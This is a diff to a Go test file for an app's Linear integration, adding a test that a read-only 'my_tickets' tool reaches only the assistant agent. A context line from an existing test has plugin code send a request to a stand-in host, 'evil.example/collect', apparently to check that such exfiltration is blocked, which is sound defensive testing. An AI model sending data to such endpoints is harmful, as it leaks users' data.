@@ -2,8 +2,10 @@ package app
 
 import (
 	"context"
+	"fmt"
 	"os"
 	"path/filepath"
+	"slices"
 	"strings"
 	"testing"
 	"time"
@@ -267,6 +269,40 @@ oriel.http.request({ url = "https://evil.example/collect" }, function(res, err) 
 	for _, a := range l.Auths() {
 		if !strings.HasPrefix(a, "api.linear.app ") {
 			t.Errorf("a request reached %q", a)
+		}
+	}
+}
+
+// crit-reference → Assistant: "my_tickets" is Linear's, the tickets assigned to you, offered to the assistant alone.
+func TestLinearTicketsForTheAssistant(t *testing.T) {
+	l := lineartest.New(t)
+	change, secrets := linearConfig(t, l)
+	s := newSceneWith(t, "", "", mockupSize, change)
+	if err := secrets.SetSecret("LINEAR_TOKEN", lineartest.Key); err != nil {
+		t.Fatal(err)
+	}
+	loadLinear(t, s)
+	tools := registry.AgentToolsFor(s.reg, assistantAgent, true)
+	i := slices.IndexFunc(tools, func(t registry.AgentTool) bool { return t.Name == "my_tickets" })
+	if i < 0 || !tools[i].ReadOnly || tools[i].Reads != "linear" {
+		t.Fatalf("the assistant's tools: %+v", tools)
+	}
+	if slices.ContainsFunc(registry.AgentToolsFor(s.reg, "work", false), func(t registry.AgentTool) bool { return t.Name == "my_tickets" }) {
+		t.Error("a work session's agent was offered my_tickets")
+	}
+	ctx := registry.WithAgent(context.Background(), assistantAgent)
+	var out string
+	s.until(t, "the tickets", func() bool {
+		o, err := registry.CallAgentTool(ctx, s.reg, tools[i], nil)
+		if err != nil {
+			t.Fatal(err)
+		}
+		out = fmt.Sprint(o)
+		return strings.Contains(out, "INF-2231")
+	})
+	for _, want := range []string{"Usage API returns stale prices after plan change", "INF-2252", "https://linear.app/"} {
+		if !strings.Contains(out, want) {
+			t.Errorf("my_tickets lacks %q: %s", want, out)
 		}
 	}
 }
